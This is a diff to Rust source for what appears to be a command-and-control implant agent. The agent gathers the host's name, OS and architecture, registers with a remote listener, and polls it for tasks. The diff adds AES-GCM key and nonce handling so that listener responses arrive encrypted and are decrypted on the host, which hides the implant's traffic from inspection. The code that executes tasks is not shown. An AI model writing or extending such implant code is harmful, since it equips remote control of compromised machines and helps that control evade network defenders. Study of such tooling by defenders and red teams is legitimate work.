@@ -18,6 +18,7 @@ use crate::{
         },
     },
     Config,
+    crypto::aesgcm::{encrypt, decrypt, encode, decode},
     utils::random::random_name,
 };
 
@@ -46,7 +47,15 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port.to_owned(),
     );
 
-    let mut ra = AgentData::new(agent_name, hostname, os, arch, listener_url);
+    let mut ra = AgentData::new(
+        agent_name,
+        hostname,
+        os,
+        arch,
+        listener_url,
+        config.key.to_string(),
+        config.nonce.to_string()
+    );
     let ra_json = serde_json::to_string(&ra).unwrap();
 
     // Agent registration process
@@ -58,13 +67,15 @@ pub async fn run(config: Config) -> Result<(), Error> {
         let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
             Ok(resp) => {
                 registered = true;
-                resp
+                let decoded = decode(resp.as_bytes());
+                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
+                String::from_utf8(decrypted).unwrap()
             }
             Err(e) => {
                 continue;
             }
         };
-        println!("{response}");
+        println!("{}", response);
     }
 
     loop {
@@ -74,7 +85,11 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
         // Get task
         let task = match post(&mut hconnect, "/task/ask".to_owned(), ra_json.to_string()).await {
-            Ok(resp) => resp,
+            Ok(resp) => {
+                let decoded = decode(resp.as_bytes());
+                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
+                String::from_utf8(decrypted).unwrap()
+            },
             Err(e) => {
                 println!("Error fetching /task/ask: {:?}", e);
                 continue;
